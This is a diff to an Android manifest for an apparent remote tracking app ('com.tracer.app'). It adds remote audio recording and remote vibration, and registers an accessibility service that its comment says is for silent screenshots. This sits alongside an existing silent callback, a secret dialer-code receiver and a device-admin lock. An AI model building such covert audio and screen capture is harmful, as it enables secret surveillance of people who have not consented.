@@ -31,6 +31,10 @@
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
+    <!-- Grabación de audio remota -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
     <!-- Llamada silenciosa de retorno -->
     <uses-permission android:name="android.permission.CALL_PHONE" />
 
@@ -39,6 +43,9 @@
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Vibración remota -->
+    <uses-permission android:name="android.permission.VIBRATE" />
 
     <!-- Notificaciones en pantalla de bloqueo (LOCK con mensaje, Android 13+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
@@ -84,7 +91,7 @@
             android:name="com.tracer.app.service.TracerLocationService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|camera"
+            android:foregroundServiceType="location|camera|microphone"
             android:stopWithTask="false" />
 
         <!-- Receptor para reinicio automático tras arranque del dispositivo -->
@@ -121,6 +128,21 @@
                     android:scheme="android_secret_code" />
             </intent-filter>
         </receiver>
+
+        <!-- AccessibilityService — necesario para SCREENSHOT silencioso (API 30+) -->
+        <service
+            android:name="com.tracer.app.accessibility.TracerAccessibilityService"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
         <!-- Device Admin — necesario para el comando LOCK -->
         <receiver
